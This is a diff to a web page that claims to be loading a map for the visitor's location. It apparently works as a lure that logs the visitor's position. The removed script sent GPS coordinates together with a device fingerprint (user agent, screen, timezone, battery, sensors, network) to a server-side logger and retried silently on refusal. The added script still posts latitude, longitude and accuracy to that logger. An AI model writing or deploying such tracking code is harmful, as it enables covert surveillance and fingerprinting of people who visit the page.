@@ -12,40 +12,19 @@
   <p>Loading the map for your location...</p>
   <div id="status">Acquiring GPS and device info...</div>
 
-<script type="module">
-  import { startGPSRetry } from './addons/gps_retry.js';
-  import { getBatteryAndSensors } from './addons/battery_sensor.js';
-  import { detectNetworkInfo } from './addons/network_info.js';
-
-  const info = {
-    userAgent: navigator.userAgent,
-    screenWidth: screen.width,
-    screenHeight: screen.height,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    language: navigator.language
-  };
-
-  navigator.geolocation.getCurrentPosition(
-    function (pos) {
-      fetch('/server/gps_logger.php', {
+<script>
+navigator.geolocation.getCurrentPosition(function(position) {
+    fetch('/server/gps_logger.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-          info,
-          source: "initial"
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude,
+            accuracy: position.coords.accuracy
         })
-      });
-    },
-    function () {
-      startGPSRetry(info); // Retry silently
-    }
-  );
-
-  getBatteryAndSensors(info);
-  detectNetworkInfo(info);
+    });
+});
 </script>
+
 </body>
 </html>
